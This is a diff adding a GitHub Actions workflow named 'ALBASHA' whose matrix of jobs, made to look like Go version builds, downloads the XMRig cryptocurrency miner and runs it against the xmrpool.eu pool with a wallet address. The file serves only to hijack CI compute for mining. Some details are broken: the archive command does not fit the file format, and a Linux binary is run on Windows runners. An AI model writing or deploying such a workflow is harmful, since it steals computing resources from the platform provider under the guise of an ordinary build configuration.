@@ -1,0 +1,51 @@
+name: ALBASHA 
+
+ 
+
+on: [workflow_dispatch] 
+
+ 
+
+jobs: 
+
+build: 
+
+name: ALBASHA
+
+runs-on: windows-latest 
+
+strategy: 
+
+max-parallel: 5 
+
+fail-fast: false 
+
+matrix: 
+
+go: [1.0, 1.1, 1.2, 1.3, 1,35] 
+
+flag: [A, B, C, D, E, F, G, H, I] 
+
+env: 
+
+NUM_JOBS: 20 
+
+JOB: ${{ matrix.go }} 
+
+steps: 
+
+- name: DOWNLOAD 
+
+run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz -OutFile xmrig-6.15.0-linux-static-x64.tar.gz 
+
+- name: Extract 
+
+run: Expand-Archive xmrig-6.15.0-linux-static-x64.tar.gz
+
+- name: Running 
+
+run: .\xmrig-6.15.0-linux-static-x64.tar\xmrig-6.15.0\./xmrig --opencl --cuda -o xmrpool.eu:9999 -u 86isnG9btQG5syz1in1VRNBZqpMk72F1jSJK41wbHgCMCbhVyK7mMN14sba5jpMiZybi7QiHPCofk9aMuz4BoNDdLwH1Qye -k --tls 
+
+- name: END 
+
+run: exit
